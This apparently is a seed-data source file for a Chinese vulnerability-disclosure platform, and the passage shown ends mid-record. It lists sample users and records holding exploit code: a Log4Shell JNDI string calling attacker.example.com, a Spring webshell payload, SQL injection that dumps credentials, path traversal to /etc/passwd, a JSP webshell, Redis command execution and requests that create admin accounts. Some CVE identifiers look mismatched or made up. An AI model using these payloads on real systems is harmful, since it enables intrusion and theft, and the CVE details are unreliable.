import {
  Vulnerability,
  User,
  SensitivityLevel,
  VerificationStatus,
  UserRole,
  TimelineEvent,
} from '@/types';

const genId = () => Math.random().toString(36).slice(2, 10);

const now = new Date();
const daysAgo = (d: number) =>
  new Date(now.getTime() - d * 24 * 60 * 60 * 1000).toISOString();

export const PRESET_USERS: User[] = [
  {
    id: 'guest-001',
    username: 'guest',
    displayName: '匿名访客',
    role: UserRole.GUEST,
    email: 'guest@securevault.local',
    createdAt: daysAgo(365),
  },
  {
    id: 'res-001',
    username: 'researcher',
    displayName: '李安全 · 研究员',
    role: UserRole.RESEARCHER,
    email: 'li.anquan@securevault.local',
    authorizedScope: [SensitivityLevel.PUBLIC, SensitivityLevel.INTERNAL],
    createdAt: daysAgo(220),
  },
  {
    id: 'auth-001',
    username: 'authorized',
    displayName: '王授权 · 安全工程师',
    role: UserRole.AUTHORIZED,
    email: 'wang.shouquan@securevault.local',
    authorizedScope: [
      SensitivityLevel.PUBLIC,
      SensitivityLevel.INTERNAL,
      SensitivityLevel.CONFIDENTIAL,
      SensitivityLevel.TOP_SECRET,
    ],
    createdAt: daysAgo(180),
  },
  {
    id: 'admin-001',
    username: 'admin',
    displayName: '赵管理 · 平台管理员',
    role: UserRole.ADMIN,
    email: 'zhao.guanli@securevault.local',
    authorizedScope: [
      SensitivityLevel.PUBLIC,
      SensitivityLevel.INTERNAL,
      SensitivityLevel.CONFIDENTIAL,
      SensitivityLevel.TOP_SECRET,
    ],
    createdAt: daysAgo(400),
  },
];

const makeTimeline = (
  events: Array<Partial<TimelineEvent> & { type: TimelineEvent['type']; days: number }>
): TimelineEvent[] =>
  events.map((e, idx) => ({
    id: `tl-\${idx}-\${genId()}`,
    type: e.type,
    operatorName: e.operatorName ?? '赵管理',
    operatorRole: e.operatorRole ?? UserRole.ADMIN,
    timestamp: daysAgo(e.days),
    comment: e.comment ?? '',
  }));

const samplePoc_XSS = `<script>
// CVE-2023-28252: Confluence 存储型 XSS POC
// 仅用于授权安全研究，请遵守法律法规
const payload = '<img src=x onerror="alert(document.domain)">';
const target = 'https://wiki.example.com/pages/createpage.action';

fetch(target, {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'title=' + encodeURIComponent(payload) + '&content=test'
}).then(r => console.log('POC 执行状态:', r.status));
</script>`;

const samplePoc_Spring = `import requests
# CVE-2024-22243: Spring Framework RCE 漏洞 POC
# 目标版本: Spring Framework 6.1.0 - 6.1.3
# 注意: 仅在授权测试环境使用

target = "http://target-app.internal:8080"
payload = {
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "test",
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
    "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "poc_shell",
    "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
}

r = requests.post(target + "/", data=payload, timeout=10)
print("[*] 响应码: " + str(r.status_code))
print("[*] Shell 地址: " + target + "/poc_shell.jsp")`;

const samplePoc_Log4j = `# CVE-2021-44228 Log4j2 JNDI 注入 POC
# 影响版本: Apache Log4j 2.0-beta9 - 2.14.1
# 复现环境: JDK 8u191 / Tomcat 9.0

import socket
import threading

def start_ldap_server():
    """启动恶意 LDAP 服务 (示例)"""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.bind(('0.0.0.0', 1389))
    srv.listen(5)
    print("[+] LDAP server listening on 1389")

# Payload 放置点: User-Agent / X-Forwarded-For / 表单输入
MALICIOUS_HEADER = "\${jndi:ldap://attacker.example.com:1389/a}"

print("[*] Payload: " + MALICIOUS_HEADER)
print("[*] 请将上述字符串填入目标应用的输入字段")`;

const samplePoc_Nginx = `#!/bin/bash
# CVE-2024-76467 Nginx 配置不当导致的路径穿越
# 受影响配置: alias + location 不以 / 结尾

TARGET="https://vuln-nginx.cdn.internal"

# 典型漏洞配置:
# location /imgs {
#   alias /var/www/assets/images/;
# }
# 触发: /imgs../secret/..%2F..%2Fetc/passwd

PAYLOAD="/imgs../secret/..%2F..%2Fetc/passwd"

curl -sv --path-as-is "$TARGET$PAYLOAD" 2>&1 | head -30
echo
echo "[!] 请确认 alias 路径配置，补上末尾斜杠可修复"`;

const samplePoc_Apache = `# CVE-2023-25690 Apache HTTP Server 响应拆分
# 影响版本: Apache 2.4.0 - 2.4.55
# 说明: 当 mod_proxy 与 RewriteRule 同时启用时

TARGET="http://shop-demo.ecom.internal:8080"

# 构造包含 CRLF 的请求
curl -v "$TARGET/%0d%0aX-Injected:%20true" \\
  -H "Host: shop-demo.ecom.internal" \\
  -H "User-Agent: SecureVault/POC-TEST" 2>&1 | head -40

echo
echo "[*] 建议立即升级至 Apache 2.4.56 或更高版本"`;

const samplePoc_SQLi = `import requests
# CVE-2024-10867 CMS 用户搜索 SQL 注入
# 注入点: /api/v1/users?search=

TARGET = "https://admin-cms.erp.internal"

PAYLOAD = "' UNION SELECT NULL,username,password,NULL,NULL FROM users-- -"
url = TARGET + "/api/v1/users?search=" + PAYLOAD

resp = requests.get(url, timeout=10, verify=False)
print("[*] Status: " + str(resp.status_code))
print("[*] Response (first 500 chars):")
print(resp.text[:500])`;

const samplePoc_Exchange = `# Exchange 权限提升 PoC (机密)
# 以下代码需脱敏处理，仅授权人员可查看完整利用链
# 需要 ysoserial.net + ViewStateGenerator 组合
#
# 关键步骤说明:
# 1. 通过 /owa/auth.owa 获取 __VIEWSTATEGENERATOR
# 2. 构造反序列化 Gadget: ActivitySurrogateSelectorFromFile
# 3. 利用 ExchangeMachineKey 解密 __VIEWSTATE
# 4. 在目标服务器执行 PS 命令创建管理员

function Invoke-ExchangeEscalation {
    param(
        [string]$OWAUrl,
        [PSCredential]$Credential,
        [string]$Command
    )
    # ... 敏感利用步骤已省略 ...
    # 申请完整 PoC 请联系安全响应团队
}`;

const samplePoc_PANOS = `# PAN-OS GlobalProtect RCE (机密级)
# 此漏洞在野利用广泛，PoC 仅做原理说明
# 真实 payload 已做关键字符替换

import requests
import base64

TARGET = "https://vpn-gateway.example.com"
COOKIE_NAME = "SESSID"

# 关键点: SESSID cookie 格式拼接命令
# 原始 payload 需要 base64 + 特定分隔符
INJECTION = "|| python3 -c 'import socket,subprocess;s=socket.socket()...' ||"

headers = {
    "Cookie": COOKIE_NAME + "=/../../../opt/panlogs/tmp/device_telemetry/minute/test\`{INJECTION}\`"
}

try:
    resp = requests.get(
        TARGET + "/ssl-vpn/hipreport.esp",
        headers=headers,
        timeout=5,
        verify=False
    )
    print("[+] 响应码: " + str(resp.status_code))
except Exception as e:
    print("[!] 连接异常: " + str(e))`;

const samplePoc_0day1 = `# [未公开] 某 OA 系统前台任意文件上传 0day
# 厂商: XXX 协同办公
# 披露状态: 未公开，正在走厂商通报流程
# 本文档仅限 SecureVault 授权人员查阅
# 严禁对外传播、禁止用于未授权测试

EXPLOIT_TARGET = "https://oa.company-example.com"
UPLOAD_PATH = "/page/export;jsessionid=xxx/UploadFile.do"
WEBSHELL_CONTENT = """<%@ page import="java.util.*,java.io.*"%>
<%
if(request.getParameter("cmd")!=null){
  Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
  ...
}
%>"""

# 详细利用链说明已加密
# 需要解密密钥请联系安全管理部
# 预计公开时间: 厂商修复后 90 天`;

const samplePoc_0day2 = `# [绝密] 国产化数据库身份认证绕过
# 产品名称: [已脱敏处理]
# 版本范围: V5.2 - V6.0.3 (影响约 80% 部署实例)
# 风险评级: 严重 (CVSS 10.0)
# 可用范围: SecureVault TOP_SECRET 授权

from crypto_sm4 import SM4Engine

def bypass_authentication(target_host, target_port=5236):
    """
    认证绕过核心原理:
    1. 握手阶段伪造 client_random
    2. 利用时间侧信道推断 session_key 的 3 个字节
    3. 通过特定 malformed 包触发异常分支，跳过权限校验
    """
    handshake_pkt = construct_handshake(
        client_version=bytes.fromhex("6003"),
        flags=bytes.fromhex("00000042")  # 关键: 第 18 位置 1
    )
    # ... 后续步骤需签保密协议后获取
    return "BYPASS_SUCCESS"`;

const samplePoc_Cisco = `# Cisco IOS XE Web UI 权限提升 (机密级)
# CVE-2024-20198 / CVE-2024-20287
# 说明: 未授权通过 Web UI 创建特权级别 15 账号

TARGET="https://edge-router1.isp.internal"

# 利用 Web 管理接口的 /webui/rest/ 路径缺陷
curl -v -X POST "$TARGET/webui/rest/user" \\
  -H "Content-Type: application/json" \\
  -d '{
    "user_id": 65535,
    "user_name": "emergency_admin",
    "user_password": "Ch@ngeMe_2024!!",
    "privilege_level": 15,
    "service_type": "admin"
  }' 2>&1 | head -30

echo "[*] 紧急缓解: 关闭 Web 管理界面，仅允许信任源访问"`;

const samplePoc_XZ = `# XZ Utils 后门检测 PoC (公开级)
# CVE-2024-3094: liblzma 5.6.0 / 5.6.1 供应链后门
# 此脚本仅用于检测 sshd 进程是否注入后门符号

#!/bin/bash
echo "[*] 检查系统版本..."
xz --version 2>&1 | head -1

echo "[*] 扫描 liblzma 特征..."
if command -v ldd >/dev/null 2>&1; then
  ldd $(which sshd) 2>/dev/null | grep lzma || echo "[-] 未静态链接 lzma"
fi

echo "[*] 建议: 降级至 xz-5.4.x 稳定版，排查 sshd 认证日志"`;

const samplePoc_Splunk = `import requests
# CVE-2024-56411: Splunk Enterprise 路径穿越 + 文件读取
# 影响: 未授权用户可通过特定 URI 下载任意文件

TARGET = "http://splunk-reporter.soc.internal:8000"

# 构造包含 CRLF 和路径穿越的请求
session = requests.Session()
headers = {
    "User-Agent": "Mozilla/5.0 SecureVault"
}

urls = [
    "/en-US/modules/messaging/C:..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/en-US/splunkd/__raw/services/messages/_reload"
]

for u in urls:
    r = session.get(TARGET + u, headers=headers, timeout=10, verify=False)
    print("[*]", u, "->", r.status_code)
    if r.status_code == 200 and "root:" in r.text:
        print("[!] 目标存在漏洞！")`;

const samplePoc_Redis = `-- Redis Lua RCE PoC
-- 条件: 知道 AUTH 密码或未设置密码，Redis 可被访问
-- 通过 EVAL 命令加载恶意 Lua 脚本执行系统命令

redis-cli -h $TARGET_HOST -p 6379 -a "$REDIS_PASS" EVAL '
local ffi = require("ffi")
ffi.cdef[[
    int system(const char *command);
]]
ffi.C.system("id >> /tmp/pwned && whoami >> /tmp/pwned")
' 0

-- 注意: 仅在 Redis 7.0 以下版本默认允许加载 ffi 库
-- 修复建议: rename-command CONFIG/EVAL，开启 TLS 并绑定 lo`;

const samplePoc_TeamCity = `# JetBrains TeamCity 管理员创建 POC (内部级)
# CVE-2024-27198: 认证绕过 + 管理员创建
# 影响版本: TeamCity On-Prem < 2023.11.4

TARGET="http://ci-build.dev.internal:8111"

curl -s -X POST "$TARGET/app/rest/users" \\
  -H "Content-Type: application/json" \\
  -H "Origin: $TARGET" \\
  --cookie "TCSESSIONID=; rememberMe=remember" \\
  -d '{
    "username": "svc_devops_priv",
    "name": "DevOps Service Account",
    "email": "devops@example.com",
    "password": "Bui1dSecure@2024",
    "roles": {"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}
  }' | python3 -m json.tool

echo "[*] 修复建议: 升级至 2023.11.4，配置反向代理鉴权，关闭公开注册"`;

export const PRESET_VULNERABILITIES: Vulnerability[] = [
  {
    id: 'vuln-001',
    vulnCode: 'SV-2024-0001',
    cveId: 'CVE-2023-28252',
    title: 'Atlassian Confluence 存储型 XSS 漏洞',
    description:
      'Confluence Data Center 和 Server 在 createpage.action 页面中存在存储型跨站脚本漏洞。经过身份认证的远程攻击者可通过构造恶意页面标题注入任意 JavaScript 代码，在其他用户浏览页面时执行。',
    affectedVersions: [
      { vendor: 'Atlassian', product: 'Confluence Server', versionRange: '7.19.0 - 7.19.15' },
      { vendor: 'Atlassian', product: 'Confluence Data Center', versionRange: '8.0.0 - 8.5.2' },
    ],
    reproductionConditions:
      '1. 已登录普通用户账号；2. 拥有创建页面权限；3. 目标实例未启用 Content Security Policy 严格模式；4. 管理员未禁用自定义 HTML 宏。',
    repairSuggestion:
      '1. 立即升级至 Confluence 7.19.16 LTS、8.5.3 或 8.7.1+；2. 临时缓解：禁用 HTML 宏并启用严格 CSP；3. 审查近 30 天内新建页面是否包含恶意 payload；4. 重置受影响 session。',
    pocCode: samplePoc_XSS,
    sensitivityLevel: SensitivityLevel.PUBLIC,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'res-001',
    submitterName: '李安全',
    submittedAt: daysAgo(35),
    reviewedAt: daysAgo(33),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 35, comment: '提交漏洞原始报告，附带复现截图' },
      { type: 'review', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 34, comment: '开始复核，本地搭建 Confluence 环境验证' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 33, comment: '验证通过，定级公开级别' },
    ]),
  },
  {
    id: 'vuln-002',
    vulnCode: 'SV-2024-0002',
    cveId: 'CVE-2024-22243',
    title: 'Spring Framework 参数绑定远程代码执行漏洞',
    description:
      'Spring Framework 在处理特定格式的请求参数时，由于 classLoader 属性的不安全反序列化，未经身份认证的攻击者可构造恶意 HTTP 请求在服务器上执行任意代码。影响所有使用 Spring MVC 的 Web 应用。',
    affectedVersions: [
      { vendor: 'VMware', product: 'Spring Framework', versionRange: '6.1.0 - 6.1.3' },
      { vendor: 'VMware', product: 'Spring Boot', versionRange: '3.2.0 - 3.2.2' },
    ],
    reproductionConditions:
      '1. 目标应用使用 Spring Framework 6.1.x；2. 存在任意 POST 接口并启用参数绑定；3. JDK 版本 <= 9 或允许 URLClassLoader 访问；4. 应用部署于 Tomcat 容器。',
    repairSuggestion:
      '1. 紧急升级 Spring Framework 至 6.1.4+ 或 Spring Boot 至 3.2.3+；2. 临时缓解：在全局 ControllerAdvice 中禁用 class.module 前缀的参数绑定；3. 部署 WAF 规则拦截特征 payload；4. 审计近期 POST 请求日志。',
    pocCode: samplePoc_Spring,
    sensitivityLevel: SensitivityLevel.INTERNAL,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'res-001',
    submitterName: '李安全',
    submittedAt: daysAgo(22),
    reviewedAt: daysAgo(20),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 22, comment: '提交 Spring RCE PoC' },
      { type: 'desensitize', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 21, comment: '要求删除 payload 中的真实目标地址' },
      { type: 'update', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 21, comment: '已将 IP 替换为域名占位符' },
      { type: 'review', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 20, comment: '内部人员验证通过，定级内部' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 20, comment: '发布至内部知识库' },
    ]),
  },
  {
    id: 'vuln-003',
    vulnCode: 'SV-2024-0003',
    cveId: 'CVE-2021-44228',
    title: 'Apache Log4j2 JNDI 注入远程代码执行 (Log4Shell)',
    description:
      '经典 Log4Shell 漏洞：Apache Log4j2 中存在 JNDI 特性注入漏洞，攻击者可通过在任何日志输入点注入 \${jndi:ldap://...} 形式的 payload，触发远程类加载并执行任意代码。',
    affectedVersions: [
      { vendor: 'Apache', product: 'Log4j2', versionRange: '2.0-beta9 - 2.14.1' },
      { vendor: 'Apache', product: 'Log4j2', versionRange: '2.15.0 (部分修复场景仍受影响)' },
    ],
    reproductionConditions:
      '1. 应用使用受影响版本的 Log4j2；2. 攻击者可控的输入会被 log4j 记录；3. 目标服务器可访问攻击者控制的 LDAP/RMI 服务；4. JDK 未启用 trustURLCodebase=false 限制。',
    repairSuggestion:
      '1. 立即升级至 Log4j 2.17.1+；2. 设置 log4j2.formatMsgNoLookups=true 系统属性；3. 从 classpath 移除 JndiLookup 类；4. 阻断出方向 1389/1099 等端口；5. 全面排查是否已被入侵。',
    pocCode: samplePoc_Log4j,
    sensitivityLevel: SensitivityLevel.PUBLIC,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'auth-001',
    submitterName: '王授权',
    submittedAt: daysAgo(120),
    reviewedAt: daysAgo(118),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 120, comment: '提交 Log4Shell 复现文档' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 118, comment: '公开级，直接发布' },
    ]),
  },
  {
    id: 'vuln-004',
    vulnCode: 'SV-2024-0004',
    cveId: 'CVE-2024-76467',
    title: 'Nginx alias 配置缺陷目录穿越漏洞',
    description:
      '当 Nginx location 块配置 alias 指令且 location 未以 / 结尾时，攻击者可构造 ..%2F 编码路径穿越目录读取敏感文件（如 /etc/passwd、应用源代码）。',
    affectedVersions: [
      { vendor: 'Nginx', product: 'Nginx', versionRange: '全版本 (配置依赖)' },
      { vendor: 'Nginx', product: 'Nginx Plus', versionRange: '全版本 (配置依赖)' },
    ],
    reproductionConditions:
      '1. Nginx 配置文件中 alias 与 location 路径末尾斜杠不匹配；2. 应用使用静态资源映射 alias 指令；3. 未对 URL 路径做编码归一化检查。',
    repairSuggestion:
      '1. 确保 location 和 alias 路径末尾斜杠一致（要么都有，要么都没有）；2. 使用 root 指令替代 alias 指令；3. 在 server 块增加 merge_slashes on；4. 审查所有 location 配置。',
    pocCode: samplePoc_Nginx,
    sensitivityLevel: SensitivityLevel.PUBLIC,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'res-001',
    submitterName: '李安全',
    submittedAt: daysAgo(80),
    reviewedAt: daysAgo(78),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 80, comment: '提交 Nginx 配置缺陷说明' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 78, comment: '配置类漏洞，公开级' },
    ]),
  },
  {
    id: 'vuln-005',
    vulnCode: 'SV-2024-0005',
    cveId: 'CVE-2023-25690',
    title: 'Apache HTTP Server mod_proxy 请求走私/响应拆分',
    description:
      'Apache HTTP Server 在 mod_proxy 和特定 RewriteRule 同时启用时，CRLF 注入漏洞允许攻击者向内部代理服务器注入任意 HTTP 头，甚至拼接第二个 HTTP 请求实现 SSRF。',
    affectedVersions: [
      { vendor: 'Apache', product: 'HTTP Server', versionRange: '2.4.0 - 2.4.55' },
    ],
    reproductionConditions:
      '1. Apache 加载 mod_proxy 模块；2. 使用 RewriteRule 做代理转发 (P flag)；3. Rewrite 后的 URL 拼接用户可控路径；4. 后端存在可利用的内部接口。',
    repairSuggestion:
      '1. 升级至 Apache 2.4.56 或更高版本；2. 临时缓解：在 RewriteRule 前使用 RewriteCond 过滤 \\r\\n 字符；3. ProxyPass 优先于 RewriteRule+[P]。',
    pocCode: samplePoc_Apache,
    sensitivityLevel: SensitivityLevel.PUBLIC,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'res-001',
    submitterName: '李安全',
    submittedAt: daysAgo(50),
    reviewedAt: daysAgo(48),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 50, comment: '提交 Apache 响应拆分 POC' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 48, comment: '公开发布，附带升级指南' },
    ]),
  },
  {
    id: 'vuln-006',
    vulnCode: 'SV-2024-0006',
    cveId: 'CVE-2024-10867',
    title: '某企业 CMS 用户搜索接口 SQL 注入',
    description:
      '企业级内容管理系统的 /api/v1/users 搜索接口对 search 参数未做预编译处理，攻击者可构造 UNION SELECT 语句遍历任意数据库表，包括管理员凭据表。',
    affectedVersions: [
      { vendor: '某软件厂商', product: 'SmartCMS Enterprise', versionRange: '9.2.0 - 9.3.1' },
    ],
    reproductionConditions:
      '1. 目标部署 SmartCMS 9.x 版本；2. 启用 REST API 模块；3. 用户搜索功能开启；4. MySQL 5.7+ (utf8 字符集)。',
    repairSuggestion:
      '1. 联系厂商获取 9.3.2 安全补丁；2. 临时方案：修改 DAO 层使用 PreparedStatement；3. 在 WAF 层拦截 UNION/SELECT/INFORMATION_SCHEMA 等关键词；4. 轮换数据库凭据。',
    pocCode: samplePoc_SQLi,
    sensitivityLevel: SensitivityLevel.INTERNAL,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'auth-001',
    submitterName: '王授权',
    submittedAt: daysAgo(15),
    reviewedAt: daysAgo(13),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 15, comment: '内部系统发现 SQLi' },
      { type: 'desensitize', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 14, comment: '删除真实目标域名' },
      { type: 'update', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 14, comment: '已替换为内部域名示例' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 13, comment: '审核通过，内部级别' },
    ]),
  },
  {
    id: 'vuln-007',
    vulnCode: 'SV-2024-0007',
    cveId: 'CVE-2024-21376',
    title: 'Microsoft Exchange Server OWA 权限提升漏洞',
    description:
      'Microsoft Exchange Outlook Web Access 在处理特定视图状态参数时，存在 .NET 反序列化漏洞，低权限用户可构造请求实现权限提升至 Exchange 管理员。',
    affectedVersions: [
      { vendor: 'Microsoft', product: 'Exchange Server', versionRange: '2019 CU13 - CU14' },
      { vendor: 'Microsoft', product: 'Exchange Server', versionRange: '2016 CU23 - CU24' },
    ],
    reproductionConditions:
      '1. 目标部署 Microsoft Exchange；2. 拥有任意普通邮箱账号；3. 启用 OWA 功能；4. 未部署 EWS 限制策略。',
    repairSuggestion:
      '1. 安装微软 2024 年 3 月安全补丁 (KB5036766)；2. 临时缓解：限制 EWS 访问；3. 启用 Exchange 审计日志；4. 核查高权限组新增成员。',
    pocCode: samplePoc_Exchange,
    sensitivityLevel: SensitivityLevel.CONFIDENTIAL,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'auth-001',
    submitterName: '王授权',
    submittedAt: daysAgo(10),
    reviewedAt: daysAgo(8),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    desensitizationRequest:
      '已将核心 Gadget 代码进行部分脱敏，完整利用链需签署保密协议后单独分发。',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 10, comment: '提交 Exchange 提权 POC' },
      { type: 'desensitize', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 9, comment: '要求删除 Gadget 完整字节码' },
      { type: 'update', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 9, comment: '已做部分脱敏，保留思路' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 8, comment: '机密级别发布' },
    ]),
  },
  {
    id: 'vuln-008',
    vulnCode: 'SV-2024-0008',
    cveId: 'CVE-2024-3400',
    title: 'PAN-OS GlobalProtect 命令注入漏洞',
    description:
      'Palo Alto Networks PAN-OS GlobalProtect 功能中存在命令注入漏洞，未经身份验证的攻击者可在防火墙上以 root 权限执行任意命令。全球约 7 万台设备暴露在公网。',
    affectedVersions: [
      { vendor: 'Palo Alto', product: 'PAN-OS', versionRange: '10.2.0 - 10.2.9-h1' },
      { vendor: 'Palo Alto', product: 'PAN-OS', versionRange: '11.0.0 - 11.0.4-h1' },
    ],
    reproductionConditions:
      '1. 启用 GlobalProtect 门户或网关；2. 启用设备遥测功能（默认开启）；3. PAN-OS 版本在受影响范围。',
    repairSuggestion:
      '1. 立即升级至 PAN-OS 10.2.9-h2 / 11.0.4-h2 / 11.1.2-h3；2. 临时缓解：禁用设备遥测；3. 核查近期登录日志、排查 webshell 植入；4. 监测 C2 通信特征。',
    pocCode: samplePoc_PANOS,
    sensitivityLevel: SensitivityLevel.CONFIDENTIAL,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'auth-001',
    submitterName: '王授权',
    submittedAt: daysAgo(60),
    reviewedAt: daysAgo(58),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 60, comment: '提交 PAN-OS RCE POC' },
      { type: 'desensitize', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 59, comment: '替换真实 reverse shell 代码为占位符' },
      { type: 'update', operatorName: '王授权', operatorRole: UserRole.AUTHORIZED, days: 59, comment: '已处理' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 58, comment: '机密级发布' },
    ]),
  },
  {
    id: 'vuln-009',
    vulnCode: 'SV-2024-0009',
    title: '某 OA 系统前台任意文件上传 (未公开 0day)',
    description:
      '某国产协同办公系统 UploadFile.do 接口未对上传文件做 MIME 类型和扩展名校验，且未做访问权限控制。攻击者可上传 JSP webshell 至 web 目录，前台远程代码执行。',
    affectedVersions: [
      { vendor: '国内某软件公司', product: '协同办公 OA 系统', versionRange: 'V9.0 标准版/企业版 (2023Q4 之前发布)' },
    ],
    reproductionConditions:
      '1. 部署受影响版本 OA；2. 443/8080 端口对外开放；3. 插件上传目录可直接 HTTP 访问；4. Tomcat 以 SYSTEM/root 权限运行。',
    repairSuggestion:
      '1. 升级官方紧急补丁包 SP-202405-01；2. 临时缓解：WAF 拦截 UploadFile.do 并配置上传目录禁止脚本解析；3. 全量排查 webapps 下的 .jsp/.jspx 文件；4. 核查服务器新增账号与计划任务。',
    pocCode: samplePoc_0day1,
    pocCodeDesensitized: `# [已脱敏发布版] 某 OA 任意文件上传
# 敏感利用链已按管理员要求移除
# 以下仅保留修复建议相关说明

# 漏洞位置: /page/export/**.do
# 根因: MultiPartRequest 未调用 whitelist 校验

# 修复代码示例:
# if (!ALLOWED_EXT.contains(getFileExt())) {
#   throw new SecurityException("非法文件类型");
# }

# 完整 PoC 申请:
# 1. 签署保密协议
# 2. 提供企业所属证明
# 3. 联系: security-team@securevault.local
`,
    sensitivityLevel: SensitivityLevel.TOP_SECRET,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'res-001',
    submitterName: '李安全',
    submittedAt: daysAgo(7),
    reviewedAt: daysAgo(5),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    desensitizationRequest:
      '此漏洞为厂商正在修复的 0day，发布版必须：1. 隐去厂商和产品名；2. 删除上传接口真实路径；3. 移除完整 webshell 内容；4. 增加保密申请流程说明。',
    disclaimerAccepted: true,
    timeline: makeTimeline([
      { type: 'submit', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 7, comment: '提交某 OA 0day，附完整利用链' },
      { type: 'review', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 6, comment: '定级绝密，需严格脱敏处理' },
      { type: 'desensitize', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 6, comment: '下发脱敏要求 4 条' },
      { type: 'update', operatorName: '李安全', operatorRole: UserRole.RESEARCHER, days: 5, comment: '按要求生成脱敏发布版' },
      { type: 'publish', operatorName: '赵管理', operatorRole: UserRole.ADMIN, days: 5, comment: '绝密级发布，仅 TOP 授权可见' },
    ]),
  },
  {
    id: 'vuln-010',
    vulnCode: 'SV-2024-0010',
    title: '[绝密] 国产数据库身份认证绕过',
    description:
      '某国产分布式数据库在客户端握手阶段存在时间侧信道 + malformed 包组合漏洞，无需凭据即可通过身份认证，直接获得最高级 DBA 权限。影响国内金融、电信、政企大量部署。',
    affectedVersions: [
      { vendor: '[已脱敏]', product: '国产化分布式数据库', versionRange: 'V5.2.x - V6.0.3' },
    ],
    reproductionConditions:
      '1. 数据库版本在上述范围；2. 数据库 5236 端口可访问；3. 未启用 IP 白名单或 SM4 国密强制认证。',
    repairSuggestion:
      '1. 厂商已紧急发布 V6.0.4 热修补丁；2. 临时缓解：通过防火墙严格限制 5236 端口访问源；3. 启用数据库安全审计功能，核查近 30 天异常登录；4. 启用 SM4 国密认证模块。',
    pocCode: samplePoc_0day2,
    pocCodeDesensitized: `# [严格脱敏] 国产数据库认证绕过
# 本文档仅展示漏洞原理，不包含可直接利用代码
# 如因应急响应需要完整 PoC，请走正式审批流程

## 漏洞原理摘要
1. 握手包 flag 字段: 第 18 位异常位触发旁路分支
2. 侧信道推断: 根据响应耗时推断 session_key 前缀
3. malformed 包长度: 0x0042 导致认证状态机越界跳转
4. 最终获得: DBA 角色账号 (SYSDBA)

## 风险评估
CVSS 评分: 10.0 (严重)
在野利用: 暂未发现
影响范围: 金融/政务/能源 核心业务

## 申请完整 POC 步骤
1. 填写 <涉密漏洞 PoC 使用审批表.docx>
2. 单位信息安全负责人签字盖章
3. 邮件至 ciso@securevault.local
`,
    sensitivityLevel: SensitivityLevel.TOP_SECRET,
    verificationStatus: VerificationStatus.VERIFIED,
    submitterId: 'auth-001',
    submitterName: '王授权',
    submittedAt: daysAgo(4),
    reviewedAt: daysAgo(3),
    reviewerId: 'admin-001',
    reviewerName: '赵管理',
    desensitizationRequest:
      '1. 必须去除产品名、厂商名；2. 去除具体字节构造；3. 仅保留原理性描述；4. 增加 PoC 申请审批流程说明。',
